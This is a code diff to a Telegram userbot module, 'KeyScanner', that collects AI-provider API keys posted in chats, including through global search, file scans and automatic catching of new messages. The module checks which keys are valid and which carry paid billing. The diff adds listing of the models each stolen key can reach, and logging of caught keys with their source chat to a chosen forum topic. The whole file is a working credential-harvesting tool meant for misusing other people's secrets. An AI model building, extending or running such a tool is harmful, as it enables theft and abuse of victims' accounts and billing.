@@ -17,12 +17,13 @@
 # meta developer: @GoyModules
 # requires: aiohttp
 
-__version__ = (1, 9)
+__version__ = (2, 0)
 import re
 import aiohttp
 import asyncio
 import json
 import io
+from urllib.parse import urlparse, unquote
 from herokutl.types import Message
 from .. import loader, utils
 
@@ -72,7 +73,7 @@ class KeyScanner(loader.Module):
         "auto_on":       f"{E_BELL} Auto-scan <b>enabled</b> for this chat.\n{E_MSG} Catching: new messages · edits · files",
         "auto_off":      f"{E_MUTE} Auto-scan <b>disabled</b> for this chat.",
         "db_stats":      f"{E_BOX} <b>Database:</b> {{total}} keys\n{E_CARD} Paid: <b>{{paid}}</b>  {E_BATT} Free: <b>{{free}}</b>  ❓ Unknown: <b>{{unk}}</b>\n\n{E_GEAR} <b>Management Menu:</b>",
-        "stats":         f"{E_PIN} <b>Providers Stats:</b>\n{{stats_text}}",
+        "stats":         f"{E_PIN} <b>Providers / Keys / Models:</b>\n{{stats_text}}",
         "exported":      f"{E_COPY} <b>Keys exported to Saved Messages!</b>",
         "empty":         f"{E_ERR} Database is empty.",
         "deleted":       f"{E_TRASH} Key removed.",
@@ -86,9 +87,19 @@ class KeyScanner(loader.Module):
         "btn_exp_json":  "JSON",
         "btn_exp_txt":   "TXT",
         "btn_clr_inv":   "🗑 Clear Invalid",
+        "models_cache_missing": f"{E_ERR} <b>Model cache is not ready yet.</b>\n{E_GEAR} Please press <b>💳 Sort Paid / Free</b> first.",
+        "log_target_help": f"{E_LINK} <b>Log chat is not set.</b>\nUse <code>.kslogchat &lt;chat link / @username / chat_id&gt; [topic title]</code> to set it.",
+        "log_target_set": f"{E_OK} <b>Log chat saved.</b>",
+        "log_target_topic": f"{E_OK} <b>Forum topic ready.</b>",
+        "log_target_label": f"{E_LINK} <b>Log target:</b> {{target}}",
+        "log_topic_label": f"{E_FOLD2} <b>Log topic:</b> {{topic}}",
+        "log_topic_none": f"{E_ERR} <b>No log topic.</b>",
+        "btn_log_target": "🎯 Set Log Chat",
+        "btn_log_topic": "🧵 Set Topic Title",
+        "btn_log_help": "ℹ️ Log Help",
         "new_key_auto":  f"{E_BELL} <b>Auto-caught key!</b>\nProvider: <b>{{provider}}</b>",
         "list_title":    f"{E_LIST} <b>Keys List (Page {{page}}/{{total_pages}}):</b>",
-        "key_info":      f"{E_PIN} <b>Key Info:</b>\n\n{E_TAG} <b>Provider:</b> {{provider}}\n{E_CARD} <b>Tier:</b> {{tier}}\n{E_LOCK} <b>Key:</b> <code>{{key}}</code>",
+        "key_info":      f"{E_PIN} <b>Key Info:</b>\n\n{E_TAG} <b>Provider:</b> {{provider}}\n{E_CARD} <b>Tier:</b> {{tier}}\n{E_LIST} <b>Models:</b> {{models}}\n{E_LOCK} <b>Key:</b> <code>{{key}}</code>",
         "btn_check_single": "🔃 Check Key",
         "btn_del_single":   "🗑 Delete Key",
         "checking_all":  f"{E_SYNC} <b>Validating {{total}} keys...</b> Please wait.",
@@ -127,7 +138,7 @@ class KeyScanner(loader.Module):
         "auto_on":       f"{E_BELL} Авто-ловля <b>включена</b>.\n{E_MSG} Ловлю: новые сообщения · правки · файлы",
         "auto_off":      f"{E_MUTE} Авто-ловля <b>выключена</b>.",
         "db_stats":      f"{E_BOX} <b>База ключей:</b> {{total}}\n{E_CARD} Платных: <b>{{paid}}</b>  {E_BATT} Бесплатных: <b>{{free}}</b>  ❓ Неизвестно: <b>{{unk}}</b>\n\n{E_GEAR} <b>Управление:</b>",
-        "stats":         f"{E_PIN} <b>Статистика провайдеров:</b>\n{{stats_text}}",
+        "stats":         f"{E_PIN} <b>Провайдеры / ключи / модели:</b>\n{{stats_text}}",
         "exported":      f"{E_COPY} <b>Ключи выгружены в Избранное!</b>",
         "empty":         f"{E_ERR} База пуста.",
         "deleted":       f"{E_TRASH} Ключ удален.",
@@ -141,9 +152,19 @@ class KeyScanner(loader.Module):
         "btn_exp_json":  "JSON",
         "btn_exp_txt":   "TXT",
         "btn_clr_inv":   "🗑 Удалить невалид",
+        "models_cache_missing": f"{E_ERR} <b>Кэш моделей не готов.</b>\n{E_GEAR} Сначала нажми <b>💳 Сортировать Платн / Беспл</b>.",
+        "log_target_help": f"{E_LINK} <b>Чат логов не задан.</b>\nИспользуй <code>.kslogchat &lt;ссылка / @username / chat_id&gt; [название топика]</code>.",
+        "log_target_set": f"{E_OK} <b>Чат логов сохранён.</b>",
+        "log_target_topic": f"{E_OK} <b>Топик форума готов.</b>",
+        "log_target_label": f"{E_LINK} <b>Чат логов:</b> {{target}}",
+        "log_topic_label": f"{E_FOLD2} <b>Топик логов:</b> {{topic}}",
+        "log_topic_none": f"{E_ERR} <b>Топик не задан.</b>",
+        "btn_log_target": "🎯 Чат логов",
+        "btn_log_topic": "🧵 Название топика",
+        "btn_log_help": "ℹ️ Помощь по логам",
         "new_key_auto":  f"{E_BELL} <b>Пойман новый ключ!</b>\nПровайдер: <b>{{provider}}</b>",
         "list_title":    f"{E_LIST} <b>Список (Стр. {{page}}/{{total_pages}}):</b>",
-        "key_info":      f"{E_PIN} <b>Информация о ключе:</b>\n\n{E_TAG} <b>Провайдер:</b> {{provider}}\n{E_CARD} <b>Тариф:</b> {{tier}}\n{E_LOCK} <b>Ключ:</b> <code>{{key}}</code>",
+        "key_info":      f"{E_PIN} <b>Информация о ключе:</b>\n\n{E_TAG} <b>Провайдер:</b> {{provider}}\n{E_CARD} <b>Тариф:</b> {{tier}}\n{E_LIST} <b>Модели:</b> {{models}}\n{E_LOCK} <b>Ключ:</b> <code>{{key}}</code>",
         "btn_check_single": "🔃 Проверить",
         "btn_del_single":   "🗑 Удалить",
         "checking_all":  f"{E_SYNC} <b>Проверяю {{total}} ключей...</b>",
@@ -208,6 +229,9 @@ class KeyScanner(loader.Module):
         self._keys        = self.get("keys_v2", {})
         self._auto_chats  = self.get("auto_v2", [])
         self._paid_status = self.get("paid_status", {})
+        self._model_cache = self.get("models_v2", {})
+        if not isinstance(self._model_cache, dict):
+            self._model_cache = {}
         self._settings    = self.get("ks_settings", {
             "log_mode":  "none",
             "file_scan": True,
@@ -219,6 +243,16 @@ class KeyScanner(loader.Module):
         self.set("auto_v2",     self._auto_chats)
         self.set("ks_settings", self._settings)
         self.set("paid_status", self._paid_status)
+        self.set("models_v2",   getattr(self, "_model_cache", {}))
+
+    def _ensure_model_cache(self):
+        cache = getattr(self, "_model_cache", None)
+        if not isinstance(cache, dict):
+            cache = self.get("models_v2", {})
+            if not isinstance(cache, dict):
+                cache = {}
+            self._model_cache = cache
+        return cache
 
     def _db_stats_text(self):
         total = len(self._keys)
@@ -230,19 +264,19 @@ class KeyScanner(loader.Module):
     def _get_main_markup(self):
         return [
             [
-                {"text": self.strings["btn_list"],      "callback": self.ks_list, "args": (0, "all")},
-                {"text": self.strings["btn_check_all"], "callback": self.ks_val_all},
+                self._btn(self.strings["btn_list"], self.ks_list, (0, "all"), "primary"),
+                self._btn(self.strings["btn_check_all"], self.ks_val_all, style="success"),
             ],
             [
-                {"text": self.strings["btn_export"], "callback": self.ks_exp_menu},
-                {"text": self.strings["btn_stats"],  "callback": self.ks_stats},
+                self._btn(self.strings["btn_export"], self.ks_exp_menu, style="primary"),
+                self._btn(self.strings["btn_stats"], self.ks_stats, style="primary"),
             ],
             [
-                {"text": self.strings["btn_sort_paid_free"], "callback": self.ks_sort_paid_free},
+                self._btn(self.strings["btn_sort_paid_free"], self.ks_sort_paid_free, style="success"),
             ],
             [
-                {"text": self.strings["btn_settings"], "callback": self.ks_settings_menu},
-                {"text": self.strings["btn_clear"],    "callback": self.ks_clr_all},
+                self._btn(self.strings["btn_settings"], self.ks_settings_menu, style="primary"),
+                self._btn(self.strings["btn_clear"], self.ks_clr_menu, style="danger"),
             ],
         ]
 
@@ -253,18 +287,385 @@ class KeyScanner(loader.Module):
             return {k: v for k, v in self._keys.items() if self._paid_status.get(k) == "free"}
         return dict(self._keys)
 
+    def _style(self, kind: str | None):
+        return {"danger": "danger", "success": "success", "primary": "primary"}.get(kind or "", None)
+
+    def _btn(self, text: str, callback, args=None, style: str | None = None):
+        btn = {"text": text, "callback": callback}
+        if args is not None:
+            btn["args"] = args
+        btn_style = self._style(style)
+        if btn_style:
+            btn["style"] = btn_style
+        return btn
+
+    def _models_text(self, models, limit: int = 5, provider: str | None = None):
+        models = [m for m in dict.fromkeys(models or []) if m]
+        if provider:
+            models = self._sort_models(provider, models)
+        if not models:
+            return "—"
+        if len(models) <= limit:
+            return ", ".join(models)
+        return ", ".join(models[:limit]) + f" … (+{len(models) - limit})"
+
+    def _sort_models(self, provider: str, models):
+        models = [m for m in dict.fromkeys(models or []) if m]
+        if not models:
+            return []
+        prov = (provider or "").lower()
+        if prov == "gemini":
+            def gemini_key(name: str):
+                n = name.lower()
+                version = (0, 0, 0)
+                m = re.search(r"gemini-(\d+(?:\.\d+)*)", n)
+                if m:
+                    parts = [int(p) for p in m.group(1).split(".")]
+                    version = tuple((parts + [0, 0, 0])[:3])
+                tier_weight = 0
+                for token, weight in (
+                    ("pro-preview", 700),
+                    ("pro", 650),
+                    ("thinking", 600),
+                    ("flash-preview", 550),
+                    ("flash", 500),
+                    ("preview", 450),
+                    ("lite", 300),
+                    ("experimental", 100),
+                    ("experimental", 100),
+                ):
+                    if token in n:
+                        tier_weight = max(tier_weight, weight)
+                build = 0
+                m2 = re.search(r"-(\d+)$", n)
+                if m2:
+                    build = -int(m2.group(1))
+                return (-version[0], -version[1], -version[2], -tier_weight, build, n)
+            return sorted(models, key=gemini_key)
+
+        def generic_key(name: str):
+            n = name.lower()
+            weight = 0
+            for token, w in (
+                ("pro", 300),
+                ("preview", 250),
+                ("flash", 200),
+                ("thinking", 180),
+                ("standard", 140),
+                ("lite", 120),
+                ("mini", 100),
+                ("small", 80),
+                ("experimental", 20),
+            ):
+                if token in n:
+                    weight = max(weight, w)
+            ver = tuple(int(x) for x in re.findall(r"\d+", n)[:4])
+            ver = tuple((list(ver) + [0, 0, 0, 0])[:4])
+            return (-weight, tuple(-x for x in ver), n)
+        return sorted(models, key=generic_key)
+
+
+    def _log_target(self):
+        target = self._settings.get("log_target", {}) or {}
+        if not isinstance(target, dict):
+            target = {"chat_id": None, "thread_id": None, "topic_title": "Logs"}
+            self._settings["log_target"] = target
+        target.setdefault("chat_id", None)
+        target.setdefault("thread_id", None)
+        target.setdefault("topic_title", "Logs")
+        return target
+
+    def _chat_to_text(self, chat_id):
+        if chat_id is None:
+            return "—"
+        return f"<code>{chat_id}</code>"
+
+    def _log_target_text(self):
+        target = self._log_target()
+        chat_id = target.get("chat_id")
+        thread = target.get("thread_id")
+        topic = target.get("topic_title") or "Logs"
+        chat_text = self._chat_to_text(chat_id) if chat_id is not None else "—"
+        thread_text = f"<code>{thread}</code>" if thread else "—"
+        return f"{chat_text} · {thread_text} · <b>{topic}</b>"
+
+    def _is_forum_chat(self, chat) -> bool:
+        if chat is None:
+            return False
+        for attr in ("is_forum", "forum", "forum_enabled", "has_topics", "has_topics_enabled"):
+            val = getattr(chat, attr, None)
+            if isinstance(val, bool) and val:
+                return True
+        return False
+
+    async def _resolve_entity_best_effort(self, raw: str):
+        raw = (raw or "").strip()
+        if not raw:
+            return None
+
+        
+        if raw.lstrip("-").isdigit():
+            return int(raw)
+
+        
+        if raw.startswith("t.me/"):
+            raw = "https://" + raw
+        if raw.startswith("http://") or raw.startswith("https://"):
+            parsed = urlparse(raw)
+            host = (parsed.netloc or "").lower()
+            path = parsed.path.strip("/")
+            if host.endswith("t.me") or host.endswith("telegram.me"):
+                
+                if path.startswith("c/"):
+                    parts = path.split("/")
+                    if len(parts) >= 2 and parts[1].isdigit():
+                        return int(f"-100{parts[1]}")
+                
+                if path and not path.startswith(("joinchat", "+")):
+                    raw = "@" + path.split("/")[0]
+        elif not raw.startswith("@") and re.fullmatch(r"[A-Za-z0-9_]{5,}", raw):
+            raw = "@" + raw
+
+        
+        for meth in ("get_entity", "get_chat"):
+            fn = getattr(self.client, meth, None)
+            if callable(fn):
+                try:
+                    entity = await fn(raw)
+                    if entity is None:
+                        continue
+                    for attr in ("id", "chat_id"):
+                        val = getattr(entity, attr, None)
+                        if isinstance(val, int):
+                            return val
+                    if isinstance(entity, dict):
+                        for key in ("id", "chat_id"):
+                            val = entity.get(key)
+                            if isinstance(val, int):
+                                return val
+                    if isinstance(entity, int):
+                        return entity
+                except Exception:
+                    pass
+
+        
+        if "joinchat" in raw or "/+" in raw or raw.startswith("https://t.me/+"):
+            for meth in ("join_chat", "import_chat_invite_link", "joinChatByInviteLink", "joinChannelByInviteLink"):
+                fn = getattr(self.client, meth, None)
+                if callable(fn):
+                    try:
+                        entity = await fn(raw)
+                        if entity is None:
+                            continue
+                        for attr in ("id", "chat_id"):
+                            val = getattr(entity, attr, None)
+                            if isinstance(val, int):
+                                return val
+                        if isinstance(entity, int):
+                            return entity
+                    except Exception:
+                        pass
+
+        return raw
+
+    async def _create_forum_topic(self, chat_ref, title: str):
+        title = (title or "Logs").strip()[:128] or "Logs"
+        for meth in ("createForumTopic", "create_forum_topic"):
+            fn = getattr(self.client, meth, None)
+            if callable(fn):
+                try:
+                    try:
+                        return await fn(chat_ref, title)
+                    except TypeError:
+                        return await fn(chat_id=chat_ref, name=title)
+                except Exception:
+                    pass
+        return None
+
+    def _topic_thread_id_from_result(self, result):
+        if result is None:
+            return None
+        for attr in ("message_thread_id", "thread_id", "id"):
+            val = getattr(result, attr, None)
+            if isinstance(val, int):
+                return val
+        if isinstance(result, dict):
+            for key in ("message_thread_id", "thread_id", "id"):
+                val = result.get(key)
+                if isinstance(val, int):
+                    return val
+        return None
+
+    async def _ensure_log_destination(self, create_if_missing: bool = True):
+        target = self._log_target()
+        chat_ref = target.get("chat_id")
+        if chat_ref is None:
+            return None, None
+
+        thread_id = target.get("thread_id")
+        topic_title = target.get("topic_title") or "Logs"
+
+        if thread_id:
+            return chat_ref, thread_id
+
+        chat_obj = None
+        for meth in ("get_entity", "get_chat"):
+            fn = getattr(self.client, meth, None)
+            if callable(fn):
+                try:
+                    chat_obj = await fn(chat_ref)
+                    break
+                except Exception:
+                    pass
+
+        if chat_obj is not None and self._is_forum_chat(chat_obj) and create_if_missing:
+            topic = await self._create_forum_topic(chat_ref, topic_title)
+            thread_id = self._topic_thread_id_from_result(topic)
+            if thread_id:
+                target["thread_id"] = thread_id
+                self._save()
+                return chat_ref, thread_id
+
+        return chat_ref, None
+
+    async def _send_log_text(self, text: str):
+        mode = self._settings.get("log_mode", "none")
+        if mode == "none":
+            return
+        if mode == "saved":
+            try:
+                await self.client.send_message("me", text, parse_mode="html")
+            except Exception:
+                pass
+            return
+
+        chat_ref, thread_id = await self._ensure_log_destination(create_if_missing=True)
+        if chat_ref is None:
+            return
+        kwargs = {"parse_mode": "html"}
+        if thread_id:
+            kwargs["message_thread_id"] = thread_id
+        try:
+            await self.client.send_message(chat_ref, text, **kwargs)
+        except TypeError:
+            kwargs.pop("message_thread_id", None)
+            try:
+                await self.client.send_message(chat_ref, text, **kwargs)
+            except Exception:
+                pass
+        except Exception:
+            pass
+
+
+    def _provider_model_base(self, provider: str):
+        mapping = {
+            "OpenAI": ("https://api.openai.com/v1", "Bearer"),
+            "DeepSeek": ("https://api.deepseek.com", "Bearer"),
+            "Perplexity": ("https://api.perplexity.ai", "Bearer"),
+            "Mistral": ("https://api.mistral.ai/v1", "Bearer"),
+            "Together": ("https://api.together.xyz/v1", "Bearer"),
+            "XAI": ("https://api.x.ai/v1", "Bearer"),
+            "Fireworks": ("https://api.fireworks.ai/inference/v1", "Bearer"),
+            "Novita": ("https://api.novita.ai/v3", "Bearer"),
+            "SiliconFlow": ("https://api.siliconflow.cn/v1", "Bearer"),
+            "DeepInfra": ("https://api.deepinfra.com/v1/openai", "Bearer"),
+            "ZhipuAI": ("https://open.bigmodel.cn/api/paas/v4", "Bearer"),
+            "Groq": ("https://api.groq.com/openai/v1", "Bearer"),
+            "OpenRouter": ("https://openrouter.ai/api/v1", "Bearer"),
+            "Anthropic": ("https://api.anthropic.com/v1", "x-api-key"),
+        }
+        return mapping.get(provider)
+
+    async def _discover_models(self, session, key: str, provider: str):
+        try:
+            if provider == "Gemini":
+                url = f"https://generativelanguage.googleapis.com/v1beta/models?key={key}"
+                async with session.get(url, timeout=6) as r:
+                    if r.status != 200:
+                        return []
+                    data = await r.json()
+                    items = data.get("models") or data.get("data") or []
+                    out = []
+                    for item in items:
+                        name = item.get("name") or item.get("model") or item.get("id")
+                        if not name:
+                            continue
+                        out.append(name.rsplit("/", 1)[-1])
+                    return out
+
+            if provider == "Anthropic":
+                headers = {"x-api-key": key, "anthropic-version": "2023-06-01"}
+                async with session.get("https://api.anthropic.com/v1/models", headers=headers, timeout=6) as r:
+                    if r.status != 200:
+                        return []
+                    data = await r.json()
+                    items = data.get("data") or []
+                    return [i.get("id") for i in items if i.get("id")]
+
+            if provider == "OpenRouter":
+                headers = {"Authorization": f"Bearer {key}"}
+                async with session.get("https://openrouter.ai/api/v1/models", headers=headers, timeout=6) as r:
+                    if r.status != 200:
+                        return []
+                    data = await r.json()
+                    items = data.get("data") or []
+                    return [i.get("id") for i in items if i.get("id")]
+
+            base = self._provider_model_base(provider)
+            if base:
+                base_url, auth_type = base
+                headers = {"Authorization": f"Bearer {key}"} if auth_type == "Bearer" else {"x-api-key": key}
+                async with session.get(f"{base_url}/models", headers=headers, timeout=6) as r:
+                    if r.status != 200:
+                        return []
+                    data = await r.json()
+                    items = data.get("data") or data.get("models") or []
+                    out = []
+                    for item in items:
+                        if isinstance(item, str):
+                            out.append(item)
+                            continue
+                        name = item.get("id") or item.get("name") or item.get("model")
+                        if name:
+                            out.append(name)
+                    return out
+        except Exception:
+            pass
+        return []
+
+    def _tier_from_models(self, provider: str, models):
+        models = [m for m in (models or []) if m]
+        if provider == "Gemini":
+            paid_markers = (
+                "veo", "lyria", "computer-use", "imagen", "2.5-pro", "3-pro",
+                "preview", "experimental", "thinking", "ultra"
+            )
+            if any(any(tok in m.lower() for tok in paid_markers) for m in models):
+                return "paid"
+            return "unknown" if models else "unknown"
+        return None
+
+    async def _register_key(self, session, key: str, provider: str, source_chat_id, via: str = "message"):
+        models = await self._discover_models(session, key, provider)
+        tier = self._tier_from_models(provider, models)
+        if tier is None:
+            tier = await self._check_paid(session, key, provider, models=models)
+        self._keys[key] = provider
+        self._paid_status[key] = tier
+        if models:
+            self._ensure_model_cache()[key] = models
+        else:
+            self._ensure_model_cache().pop(key, None)
+        await self._handle_new_key(key, provider, source_chat_id, via=via)
+
     async def _handle_new_key(self, key: str, provider: str, source_chat_id, via: str = "message"):
         mode = self._settings.get("log_mode", "none")
         if mode == "none":
             return
-        text   = self.strings["new_key_notif"].format(
+        text = self.strings["new_key_notif"].format(
             provider=provider, key=key, chat_id=source_chat_id, via=via
         )
-        target = "me" if mode == "saved" else source_chat_id
-        try:
-            await self.client.send_message(target, text, parse_mode="html")
-        except Exception:
-            pass
+        await self._send_log_text(text)
 
     async def _gather_chunked(self, tasks, chunk_size: int = 30):
         res = []
@@ -285,9 +686,8 @@ class KeyScanner(loader.Module):
             results = await self._gather_chunked(tasks)
             for key, (provider, is_valid) in zip(new_keys, results):
                 if is_valid:
-                    self._keys[key] = provider
                     count += 1
-                    await self._handle_new_key(key, provider, chat_id, via=via)
+                    await self._register_key(session, key, provider, chat_id, via=via)
         if count:
             self._save()
         return count
@@ -467,10 +867,17 @@ class KeyScanner(loader.Module):
 
         return "free"
 
-    async def _check_paid(self, session, key: str, provider: str) -> str:
+    async def _check_paid(self, session, key: str, provider: str, models=None) -> str:
         """Returns 'paid', 'free', or 'unknown'."""
         headers = {"Authorization": f"Bearer {key}", "Content-Type": "application/json"}
+        models = models or []
         try:
+            if provider == "Gemini" or key.startswith("AIza"):
+                
+                if any(re.search(r"(veo|lyria|computer-use|imagen|2\.5-pro|3-pro|preview|experimental|thinking|ultra)", m, re.I) for m in models):
+                    return "paid"
+                return "unknown"
+
             if provider == "OpenAI" or (key.startswith("sk-") and not key.startswith(("sk-or-v1-", "sk-ant-"))):
                 async with session.get(
                     "https://api.openai.com/v1/dashboard/billing/subscription",
@@ -486,18 +893,14 @@ class KeyScanner(loader.Module):
 
             elif provider == "Anthropic" or key.startswith("sk-ant-"):
                 ant_h = {"x-api-key": key, "anthropic-version": "2023-06-01"}
-                payload = {"model": "claude-haiku-4-5", "max_tokens": 1, "messages": [{"role": "user", "content": "hi"}]}
-                async with session.post(
-                    "https://api.anthropic.com/v1/messages",
-                    headers=ant_h,
-                    json=payload,
-                    timeout=5,
-                ) as r:
+                async with session.get("https://api.anthropic.com/v1/organizations",
+                                       headers=ant_h, timeout=5) as r:
                     if r.status == 200:
-                        return "paid"
-                    if r.status == 402:
-                        return "unknown"
-                    return "unknown"
+                        d = await r.json()
+                        for org in d.get("data", []):
+                            if org.get("billing_type", "") not in ("free_tier", ""):
+                                return "paid"
+                        return "free"
 
             elif provider == "OpenRouter" or key.startswith("sk-or-v1-"):
                 async with session.get("https://openrouter.ai/api/v1/auth/key",
@@ -516,17 +919,17 @@ class KeyScanner(loader.Module):
                         total = sum(a.get("amount", 0) for a in d.get("available", []))
                         return "paid" if total > 0 else "free"
 
-            elif provider == "Gemini" or key.startswith("AIza"):
-                return await self._gemini_paid_check(session, key)
+            elif provider in ("Gemini",) or key.startswith("AIza"):
+                return "unknown"
 
             elif provider == "Groq" or key.startswith("gsk_"):
-                return "unknown"  # no public billing endpoint
+                return "unknown"
 
         except Exception:
             pass
         return "unknown"
 
-    # ── Commands ──────────────────────────────────────────────────────────────
+    
     @loader.command(
         ru_doc="[лимит] - Поиск ключей через поиск сообщений.",
         en_doc="[limit] - Fast key scan via Telegram search.",
@@ -550,9 +953,8 @@ class KeyScanner(loader.Module):
                 results = await self._gather_chunked(tasks)
                 for key, (prov, ok) in zip(found, results):
                     if ok and key not in self._keys:
-                        self._keys[key] = prov
                         valid_count += 1
-                        await self._handle_new_key(key, prov,
+                        await self._register_key(session, key, prov,
                             getattr(message.to_id, "chat_id", "ScanLLM"), via="scan")
             self._save()
         await utils.answer(msg, self.strings["found"].format(valid_count=valid_count))
@@ -580,9 +982,8 @@ class KeyScanner(loader.Module):
                 results = await self._gather_chunked(tasks)
                 for key, (prov, ok) in zip(found, results):
                     if ok and key not in self._keys:
-                        self._keys[key] = prov
                         valid_count += 1
-                        await self._handle_new_key(key, prov, "Global Scan", via="global")
+                        await self._register_key(session, key, prov, "Global Scan", via="global")
             self._save()
         await utils.answer(msg, self.strings["found"].format(valid_count=valid_count))
 
@@ -658,9 +1059,8 @@ class KeyScanner(loader.Module):
             results = await self._gather_chunked([self._validate_key(session, k) for k in unique])
             for key, (prov, ok) in zip(unique, results):
                 if ok and key not in self._keys:
-                    self._keys[key] = prov
                     count += 1
-                    await self._handle_new_key(key, prov, "Import", via="import")
+                    await self._register_key(session, key, prov, "Import", via="import")
         if count:
             self._save()
         await utils.answer(msg, self.strings["imported"].format(count=count))
@@ -762,9 +1162,9 @@ class KeyScanner(loader.Module):
         cur_keys    = keys_list[start:start + per_page]
 
         markup = [[
-            {"text": ("✅ " if filter_mode == "all"  else "") + self.strings["btn_filter_all"],  "callback": self.ks_list, "args": (0, "all")},
-            {"text": ("✅ " if filter_mode == "paid" else "") + self.strings["btn_filter_paid"], "callback": self.ks_list, "args": (0, "paid")},
-            {"text": ("✅ " if filter_mode == "free" else "") + self.strings["btn_filter_free"], "callback": self.ks_list, "args": (0, "free")},
+            self._btn(("✅ " if filter_mode == "all"  else "") + self.strings["btn_filter_all"],  self.ks_list, (0, "all"), "primary" if filter_mode == "all" else None),
+            self._btn(("✅ " if filter_mode == "paid" else "") + self.strings["btn_filter_paid"], self.ks_list, (0, "paid"), "success" if filter_mode == "paid" else None),
+            self._btn(("✅ " if filter_mode == "free" else "") + self.strings["btn_filter_free"], self.ks_list, (0, "free"), "danger" if filter_mode == "free" else None),
         ]]
         for k in cur_keys:
             idx     = all_keys.index(k)
@@ -774,11 +1174,11 @@ class KeyScanner(loader.Module):
             markup.append([{"text": f"{tier_ic} [{prov}] {short}", "callback": self.ks_key_menu, "args": (idx, True)}])
         if total_pages > 1:
             markup.append([
-                {"text": "◀️", "callback": self.ks_list, "args": (page - 1, filter_mode)},
-                {"text": f"{page + 1}/{total_pages}", "callback": self.ks_list, "args": (page, filter_mode)},
-                {"text": "▶️", "callback": self.ks_list, "args": (page + 1, filter_mode)},
+                self._btn("◀️", self.ks_list, (page - 1, filter_mode), "primary"),
+                self._btn(f"{page + 1}/{total_pages}", self.ks_list, (page, filter_mode), "success"),
+                self._btn("▶️", self.ks_list, (page + 1, filter_mode), "primary"),
             ])
-        markup.append([{"text": self.strings["btn_back"], "callback": self.ks_back}])
+        markup.append([self._btn(self.strings["btn_back"], self.ks_back, style="primary")])
         await call.edit(
             text=self.strings["list_title"].format(page=page + 1, total_pages=total_pages),
             reply_markup=markup,
@@ -792,18 +1192,19 @@ class KeyScanner(loader.Module):
         prov = self._keys[k]
         tier = {"paid": f"{E_CARD} Paid", "free": f"{E_BATT} Free"}.get(
             self._paid_status.get(k, ""), "❓ Unknown")
+        models = self._ensure_model_cache().get(k, [])
         display = f"{k[:4]}{'*'*(len(k)-8)}{k[-4:]}" if (hidden and len(k) > 8) else k
         markup = [
-            [{"text": self.strings["btn_show_key"] if hidden else self.strings["btn_hide_key"],
-              "callback": self.ks_key_menu, "args": (idx, not hidden)}],
+            [self._btn(self.strings["btn_show_key"] if hidden else self.strings["btn_hide_key"],
+                       self.ks_key_menu, (idx, not hidden), "primary")],
             [
-                {"text": self.strings["btn_check_single"], "callback": self.ks_val_single, "args": (idx,)},
-                {"text": self.strings["btn_del_single"],   "callback": self.ks_del_single, "args": (idx,)},
+                self._btn(self.strings["btn_check_single"], self.ks_val_single, (idx,), "success"),
+                self._btn(self.strings["btn_del_single"], self.ks_del_single, (idx,), "danger"),
             ],
-            [{"text": self.strings["btn_back"], "callback": self.ks_list, "args": (0, "all")}],
+            [self._btn(self.strings["btn_back"], self.ks_list, (0, "all"), "primary")],
         ]
         await call.edit(
-            text=self.strings["key_info"].format(provider=prov, tier=tier, key=display),
+            text=self.strings["key_info"].format(provider=prov, tier=tier, key=display, models=self._models_text(models)),
             reply_markup=markup,
         )
 
@@ -838,6 +1239,7 @@ class KeyScanner(loader.Module):
         valid_c     = invalid_c = 0
         prov_stats  = {}
         self._invalid_keys_cache.clear()
+        model_cache = self._ensure_model_cache()
         async with aiohttp.ClientSession() as session:
             results = await self._gather_chunked([self._validate_key(session, k) for k in keys])
             for k, (prov, ok) in zip(keys, results):
@@ -847,6 +1249,14 @@ class KeyScanner(loader.Module):
                     valid_c += 1
                     prov_stats[prov]["valid"] += 1
                     self._keys[k] = prov
+                    try:
+                        models = await self._discover_models(session, k, prov)
+                        if models:
+                            model_cache[k] = self._sort_models(prov, models)
+                        else:
+                            model_cache.pop(k, None)
+                    except Exception:
+                        pass
                 else:
                     invalid_c += 1
                     self._invalid_keys_cache.append(k)
@@ -858,7 +1268,7 @@ class KeyScanner(loader.Module):
         markup = []
         if invalid_c > 0:
             markup.append([{"text": self.strings["btn_clr_inv"], "callback": self.ks_clr_inv}])
-        markup.append([{"text": self.strings["btn_back"], "callback": self.ks_back}])
+        markup.append([self._btn(self.strings["btn_back"], self.ks_back, style="primary")])
         await call.edit(
             text=self.strings["check_res_all"].format(
                 total=len(self._keys), v=valid_c, i=invalid_c, prov_stats=stats_str),
@@ -877,40 +1287,45 @@ class KeyScanner(loader.Module):
         )
 
     async def ks_stats(self, call):
-        providers = {}
-        paid_by_p = {}
-        for k, p in self._keys.items():
-            providers[p] = providers.get(p, 0) + 1
-            if self._paid_status.get(k) == "paid":
-                paid_by_p[p] = paid_by_p.get(p, 0) + 1
+        summary = {}
+        for key, provider in self._keys.items():
+            if provider not in summary:
+                summary[provider] = {"total": 0, "paid": 0, "free": 0, "unknown": 0}
+            summary[provider]["total"] += 1
+            tier = self._paid_status.get(key, "unknown")
+            if tier not in ("paid", "free"):
+                tier = "unknown"
+            summary[provider][tier] += 1
+
         stats_text = "\n".join(
-            f"{E_PIN} <b>{p}</b>: {c}"
-            + (f"  {E_CARD} {paid_by_p[p]}" if p in paid_by_p else "")
-            for p, c in sorted(providers.items(), key=lambda x: -x[1])
+            f"{E_PIN} <b>{provider}</b>: total <b>{s['total']}</b>  "
+            f"{E_CARD} {s['paid']}  {E_BATT} {s['free']}  ❓ {s['unknown']}"
+            for provider, s in sorted(summary.items(), key=lambda item: item[1]["total"], reverse=True)
         ) or "—"
+
         await call.edit(
             text=self.strings["stats"].format(stats_text=stats_text),
-            reply_markup=[[{"text": self.strings["btn_back"], "callback": self.ks_back}]],
+            reply_markup=[[{"text": self.strings["btn_back"], "callback": self.ks_back, "style": "primary"}]],
         )
 
     async def ks_exp_menu(self, call):
         paid_c = sum(1 for k in self._keys if self._paid_status.get(k) == "paid")
         free_c = sum(1 for k in self._keys if self._paid_status.get(k) == "free")
         markup = [[
-            {"text": self.strings["btn_exp_json"], "callback": self.ks_exp_json, "args": ("all",)},
-            {"text": self.strings["btn_exp_txt"],  "callback": self.ks_exp_txt,  "args": ("all",)},
+            self._btn(self.strings["btn_exp_json"], self.ks_exp_json, ("all",), "primary"),
+            self._btn(self.strings["btn_exp_txt"],  self.ks_exp_txt,  ("all",), "primary"),
         ]]
         if paid_c:
             markup.append([
-                {"text": f"{self.strings['btn_exp_paid']} JSON ({paid_c})", "callback": self.ks_exp_json, "args": ("paid",)},
-                {"text": f"{self.strings['btn_exp_paid']} TXT",             "callback": self.ks_exp_txt,  "args": ("paid",)},
